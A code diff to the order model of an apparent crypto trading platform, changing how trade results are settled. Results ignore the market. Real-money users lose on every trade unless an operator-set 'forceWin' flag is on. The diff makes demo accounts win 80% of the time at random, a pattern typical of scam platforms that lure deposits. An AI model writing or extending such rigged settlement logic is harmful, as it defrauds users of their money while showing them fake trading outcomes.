@@ -2,14 +2,14 @@ import mongoose from "mongoose";
 import userModel from "./usermodel.js";
 
 const durationRates = {
-  30: 12,  
+  30: 12,
   50: 12,
-  60: 18,  
-  90: 20, 
-  120: 22, 
-  180: 25, 
-  240: 28, 
-  365: 30   
+  60: 18,
+  90: 20,
+  120: 22,
+  180: 25,
+  240: 28,
+  365: 30
 };
 
 const orderSchema = new mongoose.Schema(
@@ -78,7 +78,7 @@ orderSchema.methods.preSaveLogic = async function () {
     this.expectedReturn = this.amount * (rate / 100);
     this.fee = 0; // Absolute free trades
     this.totalPayout = this.amount + this.expectedReturn;
-    
+
     if (!this.startTime) this.startTime = new Date();
     if (!this.endTime) {
       const endTime = new Date(this.startTime);
@@ -113,18 +113,33 @@ orderSchema.methods.calculateProfitLoss = async function () {
     const rateP = durationRates[this.duration] || 12;
     let percentage = 0;
 
-    if (user.forceWin) {
-      this.wasForceWin = true;
-      percentage = rateP * (this.leverage || 1);
+
+    if (this.isDemo) {
+      /// 80% chance to win, 20% chance to lose for demo users
+      let randomFactor = Math.random();
+      if (randomFactor < 0.2) {
+        this.wasRandomLose = true;
+        this.randomLossPercentage = rateP;
+        percentage = -rateP * (this.leverage || 1);
+      } else {
+        this.wasForceWin = true;
+        percentage = rateP * (this.leverage || 1);
+      }
+
     } else {
-      this.wasRandomLose = true;
-      this.randomLossPercentage = rateP;
-      percentage = -rateP * (this.leverage || 1);
+      if (user.forceWin) {
+        this.wasForceWin = true;
+        percentage = rateP * (this.leverage || 1);
+      } else {
+        this.wasRandomLose = true;
+        this.randomLossPercentage = rateP;
+        percentage = -rateP * (this.leverage || 1);
+      }
     }
 
     this.profitPercentage = parseFloat(percentage.toFixed(2));
     this.profit = Number(((this.amount * percentage) / 100).toFixed(2));
-    
+
     // Strict Math Lock: $100 + $12 = $112 exact return balance!
     this.actualPayout = Number((this.amount + this.profit).toFixed(2));
     if (this.actualPayout < 0) this.actualPayout = 0;
@@ -151,18 +166,18 @@ orderSchema.methods.calculateProfitLoss = async function () {
 orderSchema.methods.completeOrder = async function (exitPrice) {
   try {
     this.exitPrice = exitPrice;
-    
+
     // 1. Calculate the clean math locally right now
-    await this.calculateProfitLoss(); 
-    
+    await this.calculateProfitLoss();
+
     // At this point: 
     // this.profit is exactly 12
     // this.actualPayout is exactly 112
-    
+
     const safePayout = Number(Number(this.actualPayout || 0).toFixed(2));
     const safeProfit = this.profit > 0 ? Number(this.profit.toFixed(2)) : 0;
     const safeLoss = this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0;
-    
+
     const completionDate = new Date();
 
     // 2. BYPASS THE SAVE HOOK: Update the Order directly in the database
@@ -193,8 +208,8 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
     }
 
     // 3. Update User Balances cleanly
-    const targetUserId = mongoose.Types.ObjectId.isValid(this.user) 
-      ? new mongoose.Types.ObjectId(this.user.toString()) 
+    const targetUserId = mongoose.Types.ObjectId.isValid(this.user)
+      ? new mongoose.Types.ObjectId(this.user.toString())
       : this.user;
 
     const updateOperation = {
@@ -223,7 +238,7 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
       throw new Error('User document missing during order settlement processing');
     }
 
-    const finalBalance = this.isDemo === true 
+    const finalBalance = this.isDemo === true
       ? (updatedUser.demoBalance ?? 0)
       : (updatedUser.wallet?.usdt ?? 0);
 
